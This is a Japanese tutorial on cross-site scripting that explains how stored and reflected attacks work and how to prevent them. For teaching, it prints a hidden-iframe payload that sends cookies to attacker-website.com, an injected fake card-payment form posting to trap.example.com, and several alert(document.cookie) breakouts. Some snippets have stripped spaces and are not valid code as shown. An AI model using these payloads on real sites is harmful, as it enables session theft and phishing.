---
title: "XSS（クロスサイト・スクリプティング）"
---

## 概要

- **ユーザーが Web ページにアクセスすることで不正なスクリプトが実行されてしまう脆弱性または攻撃手法**
- Web アプリケーションには外部からの入力などに応じて表示が変化する箇所がある
- この部分の HTML 生成の実装に問題があると、XSS という脆弱性が生じる
- XSS 脆弱性の影響は
  - サイト利用者のブラウザ上で、攻撃者の用意したスクリプトの実行によりクッキー値を盗まれ、利用者が成りすまし被害に遭う
  - 同じくブラウザ上でスクリプトを実行させられ、サイト利用者の権限で Web アプリケーションの機能を悪用される
  - Web サイト上に偽の入力フォームが表示され、フィッシングにより利用者が個人情報を盗まれる

![](https://storage.googleapis.com/zenn-user-upload/e6fb830f72ae-20231224.png)

## 攻撃手法と影響

### XSS によるクッキー値の盗み出し

攻撃者が悪意のあるスクリプトを Web ページに注入し、そのページを閲覧するユーザーのクッキーを盗み出す。
罠サイトで `<iframe />` を使用した場合の例は以下の通り。

1. **罠サイトの作成**
   - 攻撃者は罠サイトを作成する
   - このサイトは、見た目や内容が魅力的であり、ユーザを誘引するよう設計されている
2. **`<iframe />` を用いた脆弱なサイトの埋め込み**
   - 罠サイトには、XSS 脆弱性を持つ Web サイトのページを `<iframe />` で埋め込む
   - この `src` 属性には、XSS 攻撃を実行するための悪意あるスクリプトを含む URL が指定される
3. **悪意あるスクリプトの実行**
   - ユーザが罠サイトに訪れると、`<iframe />` 内で脆弱なサイトのページが読み込まれ、埋め込まれた XSS コードが実行される
4. **クッキーの盗取**
   - 埋め込まれた XSS スクリプトは、ユーザのブラウザ上で実行され、その結果として脆弱なサイトのユーザークッキーが盗み出される

攻撃者は以下のような HTML コードを含む罠サイトを作成する。

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Special Offer</title>
  </head>
  <body>
    <h1>Click here for a special offer!</h1>
    <iframe
      style="display:none;"
      src="http://vulnerable-website.com/page?param=<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker-website.com/steal-cookie?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();</script>"
    ></iframe>
  </body>
</html>
```

この例では、攻撃者は以下のことを行なっている。

- `<iframe />` を使用して、脆弱なサイト（`vulnerable-website.com`）のページを隠しフレームとして埋め込む
- `<iframe />` の `src` 属性には、脆弱なサイトの URL と、悪意あるスクリプトを含むクエリパラメータが含まれている
- 悪意あるスクリプトは、ユーザのクッキーを読み取り、それを攻撃者のサイト（`attacker-website.com`）に送信する

### 画面の書き換え

- XSS 脆弱性は、ログイン機能のないサイトでも影響がある
- 下記は架空の市の粗大ゴミ受付サイト
- このサイトには XSS 脆弱性があるので、ページに HTML 要素を追加・変更・削除したり、フォームの送信先を変更することが可能

![](https://storage.googleapis.com/zenn-user-upload/342637324ccf-20231229.png)

- ページの実装コードは以下のようになる
- 入力画面と編集画面を兼ねているため、各入力項目の初期値が設定できるようになっている
- ここに、XSS 脆弱性がある

```php: /43/43002.php
<!DOCTYPEHTMLPUBLIC"//W3C//DTDHTML4.01Transitional//EN">
<html>
<head><title>○○市粗大ゴミ受付センター</title></head>
<body>
<form action=""method="POST">
氏   名<input size="20"name="name"value="<?phpecho@$_POST['name'];?>"><br>
住   所<input size="20"name="addr"value="<?phpecho@$_POST['addr'];?>"><br>
電話番号<input size="20"name="tel"value="<?phpecho@$_POST['tel'];?>"><br>
品   目<input size="10"name="kind"value="<?phpecho@$_POST['kind'];?>">
数   量<input size="5"name="num"value="<?phpecho@$_POST['num'];?>"><br>
<input type=submitvalue="申込">
</form>
</body>
</html>
```

各 `<input />` の `valuse` 属性には、以下のようにユーザの入力が反映されている。

```php
value="<?php echo @$_POST['name']; ?>"
value="<?php echo @$_POST['addr']; ?>"
value="<?php echo @$_POST['tel']; ?>"
value="<?php echo @$_POST['kind']; ?>"
value="<?php echo @$_POST['num']; ?>"
```

- ユーザーがフォームに入力したデータが PHP の echo ステートメントを通じてそのまま HTML に出力されている
- この実装において、ユーザーの入力が適切にサニタイズされていないため、XSS 攻撃が可能になる

- 以下の HTML は「〇〇市粗大ゴミ受付センター」サイトへの XSS 攻撃の罠サイト
- この画面は JavaScript を使用しない XSS の攻撃例を兼ねており、攻撃用 `form` の `submit` ボタンをリンクに見せかけるようスタイル指定している

```html
<html>
  <head>
    <title>粗大ゴミの申し込みがクレジットカードで</title>
  </head>
  <body>
    ○市の粗大ゴミの申し込みがクレジットカードで支払えるようになっていたので、さっそく試した。これは便利です。
    <br />
    <form action="http://example.jp/43/43002.php" method="POST">
      <!-- ↓ 注入するHTML -->
      <input
        name="name"
        type="hidden"
        value='"></form><form style=top:5px;left:5px;position:absolute;zindex:99;backgroundcolor:whiteaction=http://trap.example.com/43/43903.phpmethod=POST>粗大ゴミの回収費用がクレジットカードでお支払い頂けるようになりました<br>氏名<input size=20name=name><br>住所<input size=20name=addr><br>電話番号<input size=20name=tel><br>品目<input size=10name=kind>数量<input size=5name=num><br>カード番号<input size=16name=card>有効期限<input size=5name=thru><br><input value=申込type=submit><br><br><br><br><br></form>'
      />
      <!-- ↓ リンクに見せかけたボタン -->
      <input
        style="cursor:pointer;textdecoration:underline;color:blue;border:none;background:transparent;fontsize:100%;"
        type="submit"
        value="○○市粗大ゴミ申し込みセンター"
      />
    </form>
  </body>
</html>
```

- 罠の画面は以下

![](https://storage.googleapis.com/zenn-user-upload/5efc0b06e34b-20231229.png)

- リンクに見せかけたボタンをクリックすると、攻撃対象サイトでは以下のような HTML が生成される

```php: /43/43002.php
<!DOCTYPEHTMLPUBLIC"//W3C//DTDHTML4.01Transitional//EN">
<html>
<head><title>○○市粗大ゴミ受付センター</title></head>
<body>
<form action=""method="POST">
氏   名<input size="20"name="name"value="">
</form>
<form style=top:5px;left:5px;position:absolute;zindex:99;backgroundcolor:white action=http://trap.example.com/43/43903.phpmethod=POST>
粗大ゴミの回収費用がクレジットカードでお支払い頂けるようになりました<br>
氏     名<input size=20name=name><br>
住     所<input size=20name=addr><br>
電話 番号<input size=20name=tel><br>
品     目<input size=10name=kind>
数     量<input size=5name=num><br>
カード番号<input size=16name=card>
有効 期限<input size=5name=thru><br>
<input value=申込 type=submit><br>
<br><br><br><br>
</form><br>
住   所<input size="20"name="addr"value="<?phpecho@$_POST['addr'];?>"><br>
電話番号<input size="20"name="tel"value="<?phpecho@$_POST['tel'];?>"><br>
品   目<input size="10"name="kind"value="<?phpecho@$_POST['kind'];?>">
数   量<input size="5"name="num"value="<?phpecho@$_POST['num'];?>"><br>
<input type=submitvalue="申込">
</form>
</body>
</html>
```

以下のように、元の `form` を隠し、新たな `form` 要素を追加することにより画面を改変する。

- `</form>` により、元のサイトにある `form` 要素が終了する
- 新しい `form` 要素を開始し、`style` 属性を指定する
  - `form` を絶対座標で画面左上に位置させる
  - `z-index` に大きな値（99）を指定し、元の `form` より前面に位置付ける
  - 背景色を白に指定し、元の `form` が透けて見えないようにする
- `action` 属性の url には罠のサイトを指定する

結果、画面は以下のように改変される。

![](https://storage.googleapis.com/zenn-user-upload/4ccbe46efcb2-20231229.png)

- クレジットカードの入力欄が悪意あるスクリプトにより注入された
- この `form` の `action` 属性には罠サイトの URL が入っている
- そのため、「申込」ボタンをクリックすると、入力した内容が悪意ある人物に盗まれる

- 対策としては、**エスケープ処理**を行う
- ユーザ入力を HTML に反映する前に、`htmlspecialchars` のような PHP 関数を使用してエスケープする
- これにより、特殊文字が HTML エンティティに変換され、ブラウザがこれらをコードとして解釈することを防ぐ

### 反射型 XSS

- **攻撃用 JavaScript が、攻撃対象サイトとは別のサイト（罠サイトやメールの URL）にある場合の攻撃手法**
- 攻撃者が悪意あるスクリプトを含む URL を作成し、被害者にその URL を訪問させる
- 被害者が URL をクリックすると、そのスクリプトがウェブページ上で実行される
- 攻撃は被害者が悪意あるリンクをクリックしたときのみ発生する

#### 具体的な攻撃の流れ

1. **攻撃者が悪意あるリンクを作成**
   - 攻撃者はこのリンクをメール、ソーシャルメディア、フォーラムなどで被害者に送る
2. **リンクの配布**
   - 攻撃者はこのリンクをメール、ソーシャルメディア、フォーラムなどで被害者に送る
3. **被害者がリンクをクリック**
   - ユーザーがリンクをクリックすると、悪意あるスクリプトがそのウェブページ上で実行される
4. **スクリプト実行による影響**
   - スクリプトにより、被害者のセッション情報の窃取、改ざんされたコンテンツの表示、リダイレクトなどが行われる

![](https://storage.googleapis.com/zenn-user-upload/ea17ec818ae4-20231230.png)

### 持続型 XSS

- **攻撃用の JavaScript が、攻撃対象のデータベースなどに保存される場合の攻撃手法**
- 悪意あるスクリプトがウェブアプリケーションのサーバーに保存され、その後、ページが読み込まれるたびにスクリプトが実行される
- スクリプトはデータベース、メッセージフォーラム、訪問者のログ、コメント欄などに保存される
- 保存されたスクリプトは、ページを訪れる全てのユーザーに対して実行されるため、反射型 XSS よりも影響範囲が広い

#### 持続型 XSS 攻撃の流れ

1. **悪意あるスクリプトの作成**
   - 攻撃者は、ウェブサイトのユーザー入力欄（コメント欄、掲示板、プロフィール情報など）に実行可能な JavaScript コードを含むデータを作成する
   - 例えば、`<script>alert('XSS');</script>`
2. **スクリプトの投稿**
   - 攻撃者は、作成した悪意あるスクリプトをウェブサイトの入力欄に投稿する
   - このスクリプトはサーバーのデータベースに保存される
3. **スクリプトの保存**
   - サーバーは、攻撃者からの入力を適切にサニタイズせずにデータベースに保存する
   - これにより、悪意あるスクリプトが永続的にサーバー上に留まる
4. **被害者のページアクセス**
   - 他のユーザー（被害者）が攻撃者の投稿が含まれるページにアクセスする
   - この時、サーバーはデータベースから攻撃者の投稿を取得し、ページに表示する
5. **スクリプトの実行**
   - ページが被害者のブラウザで表示されると、サーバーから送信された悪意あるスクリプトがブラウザ上で実行される
   - これにより、被害者のセッション情報の盗取、不正なアクションのトリガー、フィッシングページへのリダイレクトなどが行われる可能性がある
6. **継続的な影響**
   - このスクリプトはサーバーに保存されているため、ページを訪れるすべてのユーザーに対して同様の攻撃が繰り返される

![](https://storage.googleapis.com/zenn-user-upload/490584d613c9-20231230.png)

- 持続型 XSS は、Web メールや SNS（SocialNetworkingService）などが典型的な攻撃ターゲット
- 持続型 XSS は罠サイトに利用者を誘導する手間がかからないことと、注意深い利用者でも被害にあう可能性が高いことが、攻撃者にとっての「メリット」になる
- 持続型 XSS も、HTML を生成している箇所に原因があることには変わりない

## 脆弱性が生まれる原因

- XSS 脆弱性が生じる原因は、HTML 生成の際に、**メタ文字**を正しく扱っていないこと
- これにより、開発者の意図しない形で HTML や JavaScript を注入・変形される現象が XSS

:::details 　メタ文字とは？

- HTML の文法上、特別な意味を持ち、HTML の解釈や表示に影響を与える文字列
- メタ文字は、通常のテキストとして表示されるのではなく、HTML マークアップの一部として処理される

#### HTML における主なメタ文字

1. **`<` と `>`**
   - HTML タグを定義するために使用される
   - 例：`<div></div>`
2. **`&`**
   - HTML エンティティを始めるために使用される
   - 例: `&nbsp;`（空白を表す）, `&lt;`（`<` を表す）
3. **`"` と `'`**
   - 属性値を囲むために使用される
   - 例: `<a href="https://example.com">`, `<input type='text'>`

:::

- メタ文字の持つ特別な意味を打ち消し、文字そのものとして扱うためには、**エスケープ**という処理を行う
- HTML のエスケープは、XSS 解消のためには非常に重要

### HTML エスケープの概要

- HTML で「`<`」という文字を表示させたい場合は、文字参照により「`&lt;`」と記述（エスケープ）する
- それを怠り、「`<`」のまま HTML を生成すると、ブラウザは「`<`」をタグの開始と解釈してしまう
- これを悪用する攻撃が XSS
- HTML のデータは、構文上の場所に応じてエスケープすべきメタ文字も変化する

以下の「要素内容」と属性値についてのエスケープ方法を説明する。

![](https://storage.googleapis.com/zenn-user-upload/41bf1cfd40d6-20240101.png)

それぞれ、パラメータが置かれた場所ごとのエスケープ方法は以下の通り。

![](https://storage.googleapis.com/zenn-user-upload/b4bc016c7795-20240101.png)

### 「要素内容」の XSS

- XSS によるクッキー値の盗み出しを例にする
- 以下は、検索画面の一部を抜き出したもの
- このページはログイン後に使用できるもので、検索キーワードを表示している
- 検索キーワードは、サイト URL のクエリパラメータに反映される
- `$_GET['keyword']` は URL の `keyword` というクエリパラメータからデータを取得するコード

```php: /43/43-001.php
<?php
  session_start();
  // ログインチェック（略）
?>
<body>
検索キーワード:<?php echo $_GET['keyword']; ?><br>
以下略
</body>
```

`http://example.jp/43/43001.php?keyword=Haskell` にアクセスした場合、画面は以下になる。

![](https://storage.googleapis.com/zenn-user-upload/296094d870ff-20240101.png)

次に、以下のようなキーワードを指定して攻撃を行う。

```
keyword=<script>alert(document.cookie)</script>
```

すると、画面は以下のようになる。

![](https://storage.googleapis.com/zenn-user-upload/0f66028ba119-20240101.png)

`<script>alert(document.cookie)</script>` の部分において、`<` や `>` のエスケープができていないため、XSS 攻撃が通用してしまう。

### 引用符で囲まない属性値の XSS

以下のように属性値が引用符で囲まれていないスクリプトは XSS 脆弱性が存在する。

```php: /43/43-003.php
<body>
  <input type=text name=email value=<?php echo $_GET['p']; ?>>
</body>
```

ここで、クエリパラメータの `p` に以下の値を与えた場合を考える。

```
p=1+onmouseover%3dalert(document.cookie)
```

URL 上の記号「`+`」はスペース、`%3d` は「`=`」を意味する。
そのため、上記の `<input />` は以下のように展開される。

```html
<input type="text" name="mail" value="1" onmouseover="alert(document.cookie)" />
```

よって、`<input />` のテキストボックスにマウスカーソルを合わせると、JavaScript が実行される。

![](https://storage.googleapis.com/zenn-user-upload/8a9ec3df55c9-20240101.png)

### 引用符で囲った属性値の XSS

以下のように属性値を引用符で囲っていても、「`"`」をエスケープしていないと XSS 攻撃が可能。

```php: /43/43-004.php
<body>
  <input type="text" name="mail" value="<?php echo $_GET['p']; ?>">
</body>
```

ここで、クエリパラメータ `p` に以下の値を与えた場合を考える。

```
p="+onmouseover%3d"alert(document.cookie)
```

`<input />` は以下のように展開される。

```html
<input type="text" name="mail" value="" onmouseover="alert(document.cookie)" />
```

## 対策

- XSS 脆弱性の主要因は HTML を生成する際の「`<`」や「`"`」に対するエスケープ漏れ
- 従って、これらをエスケープすることが重要な対策

### 基本

最小限の必須対策は、

- **要素内容については「`<`」と「`"`」をエスケープする**
- **属性値については、ダブルクォートで囲って、「`<`」と「`"`」と「`&`」をエスケープする**

### 文字エンコーディング指定

- サーバ側とブラウザ側の文字エンコーディングに差があると、XSS の原因になり得る
- よって、サーバ側とブラウザ側の両方で、使用する文字エンコーディング（通常は UTF-8）を明示的に指定する
- ブラウザ側では、HTML 文書で指定する
  - `<meta charset="UTF-8">` を HTML の`<head>` セクションに追加し、ブラウザに対してエンコーディングを指示する
- サーバ側では HTTP ヘッダーで指定する
  - レスポンスに `Content-Type` ヘッダを含める
  - 例えば `Content-Type: text/html; charset=UTF-8` のようにエンコーディングを指定する

### 保険的対策

- XSS 脆弱性は対策が必要な箇所が多く、HTML 上の文脈によって異なる対策を取る必要がある
- よって、対策漏れが発生しやすい
- そのため、保険的対策を実施することにより、根本対策が漏れていた場合に被害を低減できる場合がある

#### X-XSS-Protection レスポンスヘッダの使用

- 最近のブラウザは XSS フィルタというセキュリティ機能が存在する
- 反射的 XSS 攻撃を検出し、無害な出力に変更してくれる
- XSS フィルタはデフォルトで有効になっているが、利用者が無効にしている場合がある
- `X-XSS-Protection` レスポンスヘッダは、利用者による XSS フィルタ設定を上書きして有効化・無効化を設定したりできる

1. `X-XSS-Protection: 0`
   - XSS フィルタを無効にする。
2. `X-XSS-Protection: 1`
   - XSS フィルタを有効にする
   - XSS 攻撃が検出された場合、ページの読み込みがブロックされる
3. `X-XSS-Protection: 1; mode=block`
   - XSS フィルタを有効にし、攻撃が検出された場合はページの読み込みを全体的にブロックする
4. `X-XSS-Protection: 1; report=<reporting-uri>`
   - 攻撃が検出された場合に、報告を指定された URI に送信する

#### 入力値検証

- 入力値検証が XSS 対策となるのは、入力値の条件が英数字のみに限定できる場合に限られる
- 自由書式の入力欄については対策できない

#### クッキーに HttpOnly 属性を付与する

- `HttpOnly` 属性はクッキーに設定される属性の一つ
- クッキーのセキュリティを強化するために使われる
- この属性がクッキーに設定されていると、クッキーはクライアントサイドのスクリプト（例えば JavaScript）からアクセスできなくなる
- サーバーサイドでクッキーを設定する際に、HttpOnly 属性を指定する

## href 属性や src 属性が原因の XSS

- `a` タグ の `href` 属性、`img` タグや `frame` タグ、`iframe` タグの `src` 属性などは、URL を属性値としている
- URL を外部から変更できる場合、URL として **`javascript:JavaScript式`** という形式（javascript スキーム）で、JS を起動できる

以下のスクリプトは、外部から受け取った URL を元にリンクを作成している。

```php
<body>
   <a href="<?php　echo　htmlspecialchars($_GET['url']);?>">ブックマーク</a>
</body>
```

攻撃例として、`url` パラメータに以下を指定する。

```
url=javascript:alert(document.cookie)
```

生成される HTML は以下のようになる。

```html
<body>
  <a href="javascript:alert(document.cookie)">ブックマーク</a>
</body>
```

`href` 属性には、javascript スキームによる JS 呼び出しが指定されている。
`a` タグのリンクを踏むと、`alert(document.cookie)` が実行され、攻撃が成功する。

![](https://storage.googleapis.com/zenn-user-upload/6a2c74dfa156-20240107.png)

### 対策

- URL として、以下のいずれかのみを許容するようにチェックする
  - `http:` または `https:` で始まる絶対 URL
  - 「`/`」で始まる相対 URL（絶対パス参照）
- チェックが通った URL は、属性値として HTML エスケープする

実装例は以下の通り。

```typescript
function isSafeUrl(url: string): boolean {
  // URLがhttpまたはhttpsで始まるか、'/'で始まる相対URLの場合にtrueを返す
  return /^(https?:\/\/|\/)/i.test(url);
}

// 外部からのURLを取得（実際のコードでは適切にURLを取得する）
let externalUrl: string = "ここに外部からのURLを設定";

// 安全なURLの場合のみエスケープして出力
if (isSafeUrl(externalUrl)) {
  document.body.innerHTML = `<a href="${encodeURI(
    externalUrl
  )}">ブックマーク</a>`;
} else {
  document.body.innerHTML = `<a href="#">無効なリンク</a>`;
}
```

#### リンク先ドメイン名のチェック

リンク先として任意のドメイン名の URL を指定できる場合、利用者が気づかないうちに罠サイトに誘導される可能性がある。
外部ドメインに対するリンクが自明な場合以外は、以下のどちらかを実施すると良い。

- リンク先 URL を検証して、URL が外部ドメインである場合はエラーにする
- 外部ドメインへのリンクであることを利用者に注意喚起するためのクッションページを表示する

## JavaScript の動的生成が原因の XSS 脆弱性

### イベントハンドラの XSS

```php
<head>
  <script>
     function init(a) {} // ダミーの関数
  </script>
</head>
<body onload="init(<?php echo htmlspecialchars($_GET['name'], ENT_QUOTES) ?>')">
</body>
```

- `init(<?php echo htmlspecialchars($_GET['name'], ENT_QUOTES) ?>')` は JavaScript コンテキスト
- `htmlspecialchars()` を使用してエスケープしているので一見良さそう
- しかし、XSS 脆弱性がある

`name` パラメータに以下を指定してみる。

```
name=');alert(document.cookie)//
```

この場合、以下の HTML が生成される。

```html
<body onload="init('&#039;);alert(document.cookie)//')"></body>
```

`onload` は、属性値として文字参照が解釈されるため、以下の JavaScript が実行される。

```js
init(’’);
alert(document.cookie); //')
```

`')` の部分で `init` 関数が終了し、`alert(document.cookie)` が実行されてしまう。
以降のコードは `//` によりコメントアウトされる。

![](https://storage.googleapis.com/zenn-user-upload/fd774d0e692f-20240107.png)

- 脆弱性が混入した原因は、**JavaScript の文字列リテラルのエスケープが抜けていたこと**
- `name` パラメータ中の「`'`」が、データとしての文字「`'`」ではなく、JavaScript の文字列の終端に使用されてしまった

#### 対策

以下の手順を行う。

1. データを JavaScript 文字列リテラルとしてエスケープする
2. その結果を HTML エスケープする

JavaScript の文字列リテラルのエスケープとして最低限必要な文字は以下の通り。

| 文字 | エスケープ後 |
| ---- | ------------ |
| \    | \\\          |
| '    | \'           |
| ""   | \"           |
| 改行 | \n           |

よって、入力として「`<>'"\`」が与えられた場合、以下のエスケープが必要。

| 文字   | エスケープ後 | HTML エスケープ後               |
| ------ | ------------ | ------------------------------- |
| <>'"\  | <>\\'\\"\\\  | \&lt;\&gt;\\&\#39;\\\&quot;\\\  |

## <script> 要素が原因の XSS 脆弱性

- `<script>` 要素内で JavaScript の一部を動的生成する場合の XSS 脆弱性
- `<script>` 要素内はタグや文字参照を解釈しないので、HTML としてのエスケープは必要ない
- よって、JavaScript の文字列リテラルとしてのエスケープを行う
- しかし、それだけではダメ

以下のスクリプトの場合を考える。

```php
<?php
session_start();
function escape_js($s) {
   return mb_ereg_replace('([\\\\\'"])', '\\\1', $s);
}
?>
<body>
   <div id="name"></div>
   <script>
      var div = document.getElementById('name');
      var txt = '<?php echo escape_js($_GET['name']); ?>';
      div.textContent = txt + 'の文字数は' + txt.length + '文字です';
   </script>
</body>
```

`name` パラメータに `大谷san` を指定した場合は以下になる。

![](https://storage.googleapis.com/zenn-user-upload/be30894d9dbb-20240107.png)

- `escape_js()` は、「`\`」、「`'`」、「`"`」の前に、「`\`」を挿入することにより、入力データを JavaScript 文字列リテラルとしてエスケープしている
- これで XSS 脆弱性を対策できたはず
- しかし、入力値に「`</script>`」が含まれている場合、そこで JavaScript ソースの終端となる

以下の場合を考える。

```html
<script>
   foo('</script>');
</script>
```

- 上記スクリプトには「`</script>`」が 2 箇所あるが、最初の `</script>` で `script` 要素は終わりになる
- `script` 要素内の終端は、JavaScript としての文脈を一切考慮しない
- よって、最初に「`</script>`」が出現した時点で `script` は終わる

![](https://storage.googleapis.com/zenn-user-upload/bb5fa1c83ecb-20240107.png)

これを悪用して、`name` パラメータに以下を指定することにより XSS 攻撃が可能になる。

```
name=</script><script>alert(document.cookie)//
```

上記パラメータの入力により、以下の HTML が生成される。

```html
<body>
  <div id="name"></div>
  <script>
    var div = document.getElementById('name');
    var txt = '
  </script>
  <script>
    alert(document.cookie); //';div.textContent = txt + "の文字数は" + txt.length + "文字です";
  </script>
</body>
```

- HTML5 の規格では、`script` 要素内のデータには「`</script`」という文字の並びは出現できないことになっている
- 文字参照も解釈されないので、文字参照を使って書くこともできない

### 対策

#### JSON エンコードの使用

- **JSON エンコード**とは、データを JSON 形式の文字列に変換すつプロセス
- JavaScript では、`JSON.stringify()` 関数を使用してオブジェクトを JSON 文字列に変換する
- PHP では、`json_encode()` 関数を使用して値（配列やオブジェクトなど）を JSON 形式の文字列に変換する

:::details PHP での例

```php
<?php
session_start();
?>
<body>
   <div id="name"></div>
   <script>
      var div = document.getElementById('name');
      // JSONエンコードを用いてユーザー入力を安全に処理
      var txt = <?php echo json_encode($_GET['name']); ?>;
      div.textContent = txt + 'の文字数は' + txt.length + '文字です';
   </script>
</body>
```

`name` パラメータに以下を指定する

```
name=</script><script>alert(document.cookie)//
```

`json_encode` によりエンコードされた結果、`text` は以下のようになる。

```js
var txt = "\u003C/script\u003E\u003Cscript\u003Ealert(document.cookie)//";
```

これにより、XSS 攻撃を防げる。

:::

## JavaScript の文字列リテラルの動的生成の対策

### 基本原理

1. JavaScript の文法から、引用符（「`"`」または「`'`」）と「`\`」や改行をエスケープする
2. イベントハンドラ中の場合は、(1)の結果を文字参照により HTML エスケープして、「`"`」で囲む
3. `<script>` 要素の場合は、(1)の結果に「`</script`」という文字列が出現しないようにする

- JavaScript のエスケープルールは複雑なため、対処漏れが生じやすく、脆弱性の温床になる
- よって、JavaScript の動的生成は避けた方が良い
- しかし、JavaScript に動的なパラメータを渡したいニーズは良くあるので、次の 2 種の対策方法がある

### script 要素の外部でパラメータを定義して、JavaScript から参照する

カスタムデータ属性を使用する。

```html
<div id="x1" data-foo="123">こんにちは</div>
```

`data-foo="123"` がカスタムデータ属性。
これを取得するスクリプトは以下の通り。

```js
var div = document.getElementById("x1");
var data = div.dataset.foo; // 123
```

先ほどの例で試してみる。

```php
<body>
   <div id="name" data-name="<?php echo htmlspecialchars($_GET['name'], ENT_COMPAT, 'utf-8'); ?>"></div>
   <script>
      var div = document.getElementById('name');
      var txt = div.dataset.name; // カスタムデータ属性の取得
      div.textContent = txt + 'の文字数は' + txt.length + '文字です';
   </script>
</body>
```

上記スクリプトに対し、XSS 攻撃を行うと、`div` 要素の部分は以下となる。

```html
<div
  id="name"
  data-name="&lt;/script&gt;&lt;script&gt;alert(document.cookie)//"
></div>
```

HTML エスケープ済みのものを JavaScript で使用するため、脆弱性がなくなる。

## HTML タグや CSS の入力を許す場合の対策

- ブログや SNS の開発には、利用者の入力に HTML タグや CSS の入力を許可したい場合がある
- しかし、これらの入力を許可すると、XSS の危険性が高まる
- HTML タグの入力を許す場合、`<script>` 要素やイベントハンドラによって開発者が意図しない JavaScript の実行が可能になる場合がある
- CSS の「expressions」という機能により、JavaScript が起動できる

### 対策方法

- 入力された HTML を構文解析して、表示してよい要素のみを抽出する
- しかし、HTML の構文は複雑であるため、この方式の実装は容易でない
- よって、ライブラリを使用するのが望ましい

## React で発生しうる XSS 脆弱性

https://qiita.com/kazzzzzz/items/897f8ed89ca36a0734de
